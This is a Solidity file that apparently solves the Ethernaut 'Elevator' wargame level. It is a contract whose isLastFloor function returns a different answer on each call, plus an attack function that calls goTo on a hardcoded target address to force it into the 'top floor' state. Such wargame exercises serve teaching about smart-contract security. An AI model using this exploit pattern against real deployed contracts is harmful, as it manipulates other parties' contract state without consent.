// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

interface Elev {
    function goTo(uint _floor) external;
}

contract Build is Building {
    bool public turn = true;
    Elev elev = Elev(0xC89D7d95FD494b44012a6721cC8804F97fD92e1d);

    function isLastFloor(uint floor) public override returns (bool) {
        turn = !turn;

        if (!turn) {
            return false;
        }

        return true;
    }

    function attack(uint _floor) public {
        elev.goTo(_floor);
    }
}
